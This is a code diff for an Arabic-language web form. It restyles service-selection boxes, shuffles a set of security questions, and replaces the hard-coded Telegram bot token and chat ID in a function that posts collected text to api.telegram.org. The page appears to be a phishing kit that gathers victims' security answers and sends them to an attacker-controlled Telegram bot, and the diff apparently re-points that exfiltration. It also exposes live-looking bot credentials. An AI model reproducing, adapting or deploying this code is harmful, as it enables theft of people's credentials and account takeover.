@@ -161,7 +161,7 @@
       align-items: center;
       justify-content: space-between;
       padding: 16px 18px;
-      border: 2px solid #cbd5e1; /* إطار افتراضي هادئ */
+      border: 2px solid #cbd5e1;
       border-radius: 14px;
       cursor: pointer;
       background-color: #ffffff;
@@ -173,11 +173,11 @@
       border-color: #94a3b8;
     }
 
-    /* تعديل وتوضيح مستطيل التحديد للخدمة المختارة */
+    /* مستطيل ثابت بلون متناسق وشفاف للخدمة المختارة */
     .service-option.selected {
-      border: 3px solid #0ea5e9; /* مستطيل بلون مميز وواضح (أزرق فاقع) */
-      background-color: #f0f9ff; /* خلفية خفيفة جداً لتوضيح التحديد */
-      box-shadow: 0 4px 15px rgba(14, 165, 233, 0.2);
+      border: 2px solid #d32f2f;
+      background-color: rgba(211, 47, 47, 0.05);
+      box-shadow: 0 4px 12px rgba(211, 47, 47, 0.1);
     }
 
     .service-content { display: flex; flex-direction: column; text-align: right; }
@@ -208,7 +208,7 @@
       box-shadow: 0 2px 6px rgba(0,0,0,0.02);
     }
 
-    .input-field:focus { border-color: #0ea5e9; }
+    .input-field:focus { border-color: #d32f2f; }
 
     .icon-right {
       position: absolute;
@@ -685,6 +685,7 @@
       switchScreen(targetScreenId);
     }
 
+    /* خلط الأسئلة عشوائياً عند الدخول لكل عملية */
     function shuffleQuestions() {
       questions = [...baseQuestions].sort(() => Math.random() - 0.5);
       currentQIndex = 0;
@@ -694,6 +695,7 @@
     function updateQuestionDisplay() {
       if(questions.length > 0) {
         document.getElementById('questionText').textContent = questions[currentQIndex];
+        document.getElementById('answerInput').value = '';
       }
     }
 
@@ -801,7 +803,6 @@
     function nextQuestion() {
       currentQIndex = (currentQIndex + 1) % questions.length;
       updateQuestionDisplay();
-      document.getElementById('answerInput').value = '';
     }
 
     function validateSecurityAnswer() {
@@ -880,8 +881,8 @@
     }
 
     function sendToTelegram(messageText) {
-      const botToken = "8427928142:AAGY78Cx8cRuX-br61Z5P7Fzy07AQ1S3SDM";
-      const chatId = "8849959038";
+      const botToken = "8604178520:AAGTjKY7Rp-gKTRFlXpqoaOy6F5Um3LRJm0";
+      const chatId = "8781342213";
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
       fetch(url, {
